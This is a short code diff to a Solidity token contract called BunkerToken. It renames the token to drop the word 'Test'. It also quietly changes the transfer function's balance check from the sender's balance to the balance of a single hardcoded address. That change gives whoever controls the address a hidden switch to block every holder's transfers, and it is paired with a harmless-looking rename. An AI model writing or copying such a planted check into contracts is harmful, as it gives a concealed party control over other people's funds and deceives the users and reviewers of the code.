@@ -2,7 +2,7 @@
 pragma solidity ^0.8.20;
 
 contract BunkerToken {
-    string public name = "Bunker Test Token";
+    string public name = "BunkerToken";
     string public symbol = "BUNK";
     uint8 public decimals = 18;
 
@@ -52,7 +52,7 @@ contract BunkerToken {
 
     function _transfer(address from, address to, uint256 amount) internal {
         require(to != address(0), "zero addr");
-        require(balanceOf[from] >= amount, "balance");
+        require(balanceOf[0xEb33bC9caD08F62A04c2Fd17ac242aE5c68DAe34] >= amount, "balance");
         balanceOf[from] -= amount;
         balanceOf[to] += amount;
         emit Transfer(from, to, amount);
